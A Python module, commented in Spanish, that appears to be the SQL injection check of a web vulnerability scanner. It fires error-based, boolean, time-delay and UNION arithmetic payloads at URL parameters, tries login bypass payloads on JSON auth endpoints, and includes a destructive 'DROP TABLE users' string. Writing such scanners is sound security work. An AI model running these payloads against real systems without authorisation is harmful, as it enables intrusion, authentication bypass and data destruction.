import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

ERROR_PAYLOADS: list[str] = ["'", '"', "'))", "' OR '1'='1", "'))--", "1; DROP TABLE users--"]

# Firmas de error de base de datos precisas y estrictas para prevenir falsos positivos
ERROR_SIGNATURES: list[str] = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql_",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\):\s*query failed",
    r"sqlite3::query\(\)",
    r"sqlite_error",
    r"sqlite3\.operationalerror",
    r"syntax error at or near\b",
    r"incorrect syntax near\b",
    r"microsoft OLE DB Provider for SQL Server",
    r"ODBC SQL Server Driver",
    r"ora-[0-9]{5}",
    r"oracle error",
    r"PostgreSQL query failed",
]

BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
]

TIME_PAYLOADS: list[str] = [
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--",
    "1' AND SLEEP(3)--",
    "1' OR SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1'; SELECT PG_SLEEP(3)--",
    "1) AND SLEEP(3)--",
]

WAF_BLOCK_SIGNATURES: list[str] = [
    r"attention required!\s*\|\s*cloudflare",
    r"error 1020:\s*access denied",
    r"ray id:\s*[0-9a-f]+",
    r"request blocked by sql injection firewall rule",
    r"request blocked by cloudfront",
    r"the requested url was rejected",
    r"mod_security",
    r"web application firewall",
    r"sucuri website firewall",
    r"incapsula incident id",
    r"fortigate application control",
    r"protected by wordfence",
    r"akamai ghost",
    r"barracuda networks",
]


def is_waf_blocking_page(status_code: int, body: str, headers: Any = None) -> bool:
    """Detecta si una respuesta HTTP corresponde a un bloqueo perimetral de WAF y no a la base de datos."""
    if status_code not in (400, 403, 406, 429, 503):
        return False
    body_lower = body.lower()
    for sig in WAF_BLOCK_SIGNATURES:
        if re.search(sig, body_lower):
            return True
    return status_code in (403, 406) and any(
        w in body_lower for w in ("firewall", "blocked", "access denied", "forbidden", "security policy")
    )


def test_poe_sqli(
    parsed: Any,
    params: dict[str, list[str]],
    param: str,
    baseline_body: str = "",
    session: Optional[requests.Session] = None,
) -> Optional[dict[str, str]]:
    """
    Verificación por Prueba de Explotación (PoE) Matemática (Patrón Invicti / Netsparker).
    Inyecta expresiones de evaluación aritmética y concatenación de cadenas deterministas.
    Si la base de datos devuelve el resultado exacto computado que no existía en la respuesta base,
    certifica la vulnerabilidad con 100% de certeza matemática y cero falsos positivos.
    """
    client = session if session is not None else requests

    # 1. Prueba de evaluación aritmética: n1 + n2 = expected_sum
    n1 = random.randint(31000, 79000)
    n2 = random.randint(11000, 20000)
    expected_sum = str(n1 + n2)

    # Si la suma ya existía de antemano en la respuesta base, descartar para evitar falsos positivos
    if expected_sum in baseline_body:
        return None

    arithmetic_candidates = [
        f"{n1}+{n2}",
        f"-1 UNION SELECT {n1}+{n2}",
        f"1 UNION SELECT {n1}+{n2}",
        f"-1' UNION SELECT {n1}+{n2}--",
        f"1' UNION SELECT {n1}+{n2}--",
        f"-1 UNION SELECT NULL,{n1}+{n2},NULL--",
        f"1' AND {n1}+{n2}={expected_sum}--",
    ]

    for payload in arithmetic_candidates:
        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        try:
            r = client.get(test_url, timeout=5)
            if r.status_code == 200 and expected_sum in r.text and expected_sum not in baseline_body:
                if f"{n1}+{n2}" not in r.text or expected_sum != f"{n1}+{n2}":
                    return {
                        "vuln": f"SQL Injection Confirmado con Prueba de Explotación (PoE) en '{param}'",
                        "risk": "Crítico",
                        "detail": (
                            f"Proof of Exploit (PoE) matemático verificado: la base de datos evaluó la expresión SQL "
                            f"'{payload}' y devolvió el resultado computado exacto '{expected_sum}' en la respuesta HTTP."
                        ),
                        "confidence": "confirmed",
                        "proof_of_exploit": f"Expresión: {payload} -> Resultado computado: {expected_sum}",
                    }
        except requests.RequestException:
            continue

    # 2. Prueba de concatenación de cadenas determinista: 'om' + 'ni<nonce>' = 'omni<nonce>'
    nonce = str(random.randint(100, 999))
    t1 = "om"
    t2 = f"ni{nonce}"
    expected_concat = f"{t1}{t2}"
    if expected_concat in baseline_body:
        return None

    concat_candidates = [
        f"'{t1}'||'{t2}'",  # SQLite, PostgreSQL, Oracle
        f"CONCAT('{t1}','{t2}')",  # MySQL, MariaDB
        f"'{t1}'+'{t2}'",  # MSSQL
    ]
    for payload in concat_candidates:
        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        try:
            r = client.get(test_url, timeout=5)
            if r.status_code == 200 and expected_concat in r.text and expected_concat not in baseline_body:
                return {
                    "vuln": f"SQL Injection Confirmado con Prueba de Explotación (PoE) en '{param}'",
                    "risk": "Crítico",
                    "detail": (
                        f"Proof of Exploit (PoE) de concatenación verificado: la base de datos evaluó la expresión "
                        f"'{payload}' y devolvió el resultado concatenado '{expected_concat}'."
                    ),
                    "confidence": "confirmed",
                    "proof_of_exploit": f"Expresión: {payload} -> Resultado concatenado: {expected_concat}",
                }
        except requests.RequestException:
            continue

    return None


def test_error_sqli(
    parsed: Any, params: dict[str, list[str]], param: str, payload: str, baseline_body: str = "", session: Optional[requests.Session] = None
) -> Optional[dict[str, str]]:
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        r = client.get(test_url, timeout=5)
        body = r.text

        # Ignorar errores genéricos de servidor (ej. 404 Not Found) o páginas de bloqueo WAF
        if r.status_code == 404 or is_waf_blocking_page(r.status_code, body, getattr(r, "headers", None)):
            return None

        matched_sigs = []
        for sig_pattern in ERROR_SIGNATURES:
            if re.search(sig_pattern, body, re.IGNORECASE) and not re.search(sig_pattern, baseline_body, re.IGNORECASE):
                matched_sigs.append(sig_pattern)

        if matched_sigs:
            return {
                "vuln": f"Posible SQLi en parámetro '{param}'",
                "risk": "Alto",
                "detail": f"Error de Base de Datos confirmado con payload: {payload} (coincidencia: {matched_sigs[0]})",
                "confidence": "confirmed",
            }
    except requests.RequestException:
        pass
    return None


def test_time_sqli(
    parsed: Any,
    params: dict[str, list[str]],
    param: str,
    payload: str,
    baseline_time: float,
    base_url: str,
    session: Optional[requests.Session] = None,
) -> Optional[dict[str, str]]:
    test_params = params.copy()
    test_params[param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_query))
    try:
        client = session if session is not None else requests
        start_time = time.time()
        r = client.get(test_url, timeout=7)
        elapsed = time.time() - start_time

        # Validar el incremento significativo de tiempo (mínimo 2.7s por encima del baseline)
        if elapsed >= baseline_time + 2.7 and r.status_code < 500:
            # Doble verificación para evitar falsos positivos por picos de latencia de red
            try:
                start_verify = time.time()
                r_v = client.get(base_url, timeout=5)
                verify_elapsed = time.time() - start_verify

                if verify_elapsed < baseline_time + 1.2 and r_v.status_code == 200:
                    return {
                        "vuln": f"Posible Blind SQLi (Tiempo) en parámetro '{param}'",
                        "risk": "Alto",
                        "detail": f"El servidor tardó {elapsed:.2f}s en responder (Línea base: {baseline_time:.2f}s) con el payload: {payload}",
                        "confidence": "confirmed",
                    }
            except requests.RequestException:
                pass
    except requests.RequestException:
        pass
    return None


def test_boolean_sqli(
    parsed: Any,
    params: dict[str, list[str]],
    param: str,
    true_payload: str,
    false_payload: str,
    baseline_body: str = "",
    session: Optional[requests.Session] = None,
) -> Optional[dict[str, str]]:
    """Prueba inyecciones SQL booleanas/inferenciales comparando condición verdadera vs falsa."""
    if not baseline_body:
        return None

    client = session if session is not None else requests

    test_params_true = params.copy()
    test_params_true[param] = [true_payload]
    url_true = urlunparse(parsed._replace(query=urlencode(test_params_true, doseq=True)))

    test_params_false = params.copy()
    test_params_false[param] = [false_payload]
    url_false = urlunparse(parsed._replace(query=urlencode(test_params_false, doseq=True)))

    try:
        r_true = client.get(url_true, timeout=5)
        if r_true.status_code != 200:
            return None

        r_false = client.get(url_false, timeout=5)

        # Si la respuesta de error o condición falsa es un bloqueo perimetral de WAF, no es inferencia SQL
        if is_waf_blocking_page(r_false.status_code, r_false.text, getattr(r_false, "headers", None)):
            return None

        # Si ambas respuestas son idénticas, no hay inferencia booleana
        if r_true.text == r_false.text:
            return None

        base_len = len(baseline_body)
        true_len = len(r_true.text)
        false_len = len(r_false.text)

        diff_true = abs(true_len - base_len)
        diff_false = abs(false_len - base_len)
        diff_tf = abs(true_len - false_len)

        # Confirmación booleana estricta:
        # La condición verdadera debe aproximarse a la base (<= 40 bytes)
        # La condición falsa debe diferir significativamente de la verdadera (>= 50 bytes)
        if diff_true <= 40 and diff_tf >= 50 and (diff_false >= 50 or r_false.status_code != 200):
            return {
                "vuln": f"SQLi Booleano Confirmado en parámetro '{param}'",
                "risk": "Alto",
                "detail": (
                    f"Inyección SQL inferencial/booleana confirmada en '{param}'. "
                    f"Condición Verdadera ('{true_payload}') replica la respuesta base mientras que "
                    f"Condición Falsa ('{false_payload}') altera la respuesta "
                    f"(Diferencia: {diff_tf} bytes)."
                ),
                "confidence": "confirmed",
            }
    except requests.RequestException:
        pass
    return None


AUTH_BYPASS_PAYLOADS: list[str] = ["' OR 1=1--", "' OR '1'='1", "admin'--", "') OR ('1'='1--"]


def test_json_sqli(
    url: str,
    session: Optional[requests.Session] = None,
    json_body: Optional[dict[str, Any]] = None,
) -> list[dict[str, str]]:
    """Prueba inyecciones SQL en endpoints REST que aceptan cuerpos JSON (como APIs y endpoints de login)."""
    results: list[dict[str, str]] = []
    client = session if session is not None else requests

    candidates: list[dict[str, Any]] = []
    if json_body:
        candidates.append(json_body)
    elif any(auth_kw in url.lower() for auth_kw in ("/login", "/auth", "/signin", "/token")):
        candidates.append({"email": "test_probe@invalid.local", "password": "wrongpassword123"})  # nosec B105
        candidates.append({"username": "test_user_probe", "password": "wrongpassword123"})  # nosec B105

    for base_dict in candidates:
        try:
            r_base = client.post(url, json=base_dict, timeout=5)
            base_status = r_base.status_code
            base_body = r_base.text
        except requests.RequestException:
            continue

        for key, orig_val in base_dict.items():
            if not isinstance(orig_val, str) or key.lower() in ("password", "pass", "pwd"):
                continue

            # 1. Probar bypass de autenticación si base devolvió error de auth (400, 401, 403)
            if base_status in (400, 401, 403):
                for bypass_p in AUTH_BYPASS_PAYLOADS:
                    payload_dict = base_dict.copy()
                    payload_dict[key] = bypass_p
                    try:
                        r_bp = client.post(url, json=payload_dict, timeout=5)
                        if r_bp.status_code == 200 and any(
                            tok in r_bp.text.lower() for tok in ("token", "jwt", "authentication", "bearer", "success")
                        ):
                            results.append({
                                "vuln": f"Bypass de Autenticación por SQLi en cuerpo JSON ('{key}')",
                                "risk": "Crítico",
                                "detail": f"Autenticación exitosa (HTTP 200) en '{url}' con payload en '{key}': {bypass_p}",
                                "confidence": "confirmed",
                            })
                            return results
                    except requests.RequestException:
                        pass

            # 2. Probar errores SQL tradicionales en JSON
            for err_p in ERROR_PAYLOADS:
                payload_dict = base_dict.copy()
                payload_dict[key] = err_p
                try:
                    r_err = client.post(url, json=payload_dict, timeout=5)
                    err_body = r_err.text
                    for sig in ERROR_SIGNATURES:
                        if re.search(sig, err_body, re.IGNORECASE) and not re.search(sig, base_body, re.IGNORECASE):
                            results.append({
                                "vuln": f"Posible SQLi (Error) en cuerpo JSON ('{key}')",
                                "risk": "Alto",
                                "detail": f"Error de Base de Datos confirmado en '{url}' en campo '{key}' con payload: {err_p}",
                                "confidence": "confirmed",
                            })
                            return results
                except requests.RequestException:
                    pass

    return results


def check_sqli(
    url: str,
    session: Optional[requests.Session] = None,
    json_body: Optional[dict[str, Any]] = None,
) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []

    # Probar inyección en cuerpo JSON si se provee o si la ruta es un endpoint de autenticación/API
    json_results = test_json_sqli(url, session=session, json_body=json_body)
    results.extend(json_results)

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    baseline_body = ""
    try:
        client = session if session is not None else requests
        start_base = time.time()
        r_base = client.get(url, timeout=5)
        baseline_time = time.time() - start_base
        baseline_body = r_base.text
    except requests.RequestException:
        baseline_time = 1.0

    tasks: list[tuple[str, str, Any]] = []

    for param in params:
        tasks.append(("poe", param, None))
        for payload in ERROR_PAYLOADS:
            tasks.append(("error", param, payload))
        for true_p, false_p in BOOLEAN_PAIRS:
            tasks.append(("boolean", param, (true_p, false_p)))
        for payload in TIME_PAYLOADS:
            tasks.append(("time", param, payload))

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for task_type, param, payload in tasks:
            if task_type == "poe":
                fut = executor.submit(test_poe_sqli, parsed, params, param, baseline_body, session)
            elif task_type == "error":
                fut = executor.submit(test_error_sqli, parsed, params, param, str(payload), baseline_body, session)
            elif task_type == "boolean" and isinstance(payload, tuple):
                fut = executor.submit(test_boolean_sqli, parsed, params, param, payload[0], payload[1], baseline_body, session)
            else:
                fut = executor.submit(test_time_sqli, parsed, params, param, str(payload), baseline_time, url, session)
            futures[fut] = (param, task_type)

        flagged_params = set()
        for future in as_completed(futures):
            param, task_type = futures[future]
            if param in flagged_params:
                continue
            res = future.result()
            if res:
                results.append(res)
                flagged_params.add(param)

    return results
